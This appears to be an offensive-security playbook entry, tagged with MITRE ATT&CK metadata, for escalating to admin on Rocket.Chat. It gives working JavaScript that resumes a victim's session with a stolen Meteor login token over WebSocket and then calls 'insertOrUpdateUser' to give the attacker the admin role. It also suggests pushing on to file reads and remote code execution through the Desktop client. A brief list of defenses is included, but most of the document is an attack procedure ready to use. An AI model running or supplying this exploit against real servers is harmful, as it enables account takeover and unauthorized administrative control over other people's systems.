---
tags:
  - websocket
  - privilege-escalation
  - account-takeover
type: procedure
tools: []
tactics:
  - '[[Privilege Escalation]]'
commands:
  - '[[commands/rocket-chat-websocket-takeover]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Valid Accounts]]'
updated_at: '2025-12-14T17:33:24.254Z'
skill_level: advanced
impact_level: critical
detection_risk: high
sub_techniques: []
id: aa7525d7-0e40-42ae-a6ed-9e7d487b96bd
validated: true
mitre_tactics:
  - '[[Privilege Escalation]]'
mitre_techniques:
  - '[[Valid Accounts]]'
---
# Authenticate-and-Escalate-via-WebSocket

## Summary

This procedure uses the stolen login token to establish a WebSocket connection to Rocket.Chat, resume the victim's session, and execute Meteor methods to update the attacker's user account with admin roles, achieving takeover.

## Description

Rocket.Chat uses Meteor over SockJS WebSocket for real-time communication. The stolen token allows resuming a session via the 'login' method with {'resume': token}. Once connected, send 'method' messages like 'insertOrUpdateUser' to modify user roles (e.g., add 'admin'). This bypasses normal auth flows. For Desktop client, extend to file reads/RCE via native APIs. Prerequisites: Stolen token; attacker's user ID and email.

## Requirements

1. Stolen Meteor login token
2. Attacker's Rocket.Chat user ID and email
3. Access to WebSocket endpoint (wss://host/sockjs/...)

## Defense

Defensive measures and detection strategies:

- Validate token usage from expected IPs/user-agents
- Rate-limit WebSocket method calls
- Audit logs for role changes from resumed sessions
- Require MFA for admin actions

## Objectives

1. Resume victim session via token
2. Escalate attacker privileges
3. Confirm takeover

## Instructions

### Step 1: Establish WebSocket Connection

**Context**: Create WS client and handle initial messages.

**Command** ([[commands/rocket-chat-websocket-takeover]]):
```javascript
let ws = new WebSocket(`wss://${window.location.host}/sockjs/111/evilwss/websocket`);
ws.onmessage = function(evt) {
  // Handle pong, connect, etc.
  if (/["{\"msg\":\"pong\"}"]/.test(evt.data)) { ws.send('[{"msg":"pong"}]'); }
  // ... (full handler for connect and login)
};
```

> Expected: WS opens, pings exchanged.

### Step 2: Login with Stolen Token

**Context**: Send login method after connect.

Within the onmessage handler:

```javascript
ws.send(`[{"msg":"method","method":"login","params":[{"resume":"${localStorage.getItem('Meteor.loginToken')}"}],"id":"1"}]`);
```

> Expected: Server responds with session ID.

### Step 3: Update User Roles

**Context**: Call method to assign admin.

```javascript
ws.send('[{"msg":"method","method":"insertOrUpdateUser","params":[{"_id":"{ATTACKER_USERID}","roles":["user","admin"]}],"id":"17"}]');
```

> Expected: User updated; attacker logs in as admin.

## MITRE ATT&CK Mapping

### Tactics

- [[Privilege Escalation]] Privilege Escalation

### Techniques

- [[Valid Accounts]] Valid Accounts

### Sub-Techniques


## Commands Used

- [[commands/rocket-chat-websocket-takeover]]

## Tools Used


## Tags

- websocket
- privilege-escalation
- account-takeover
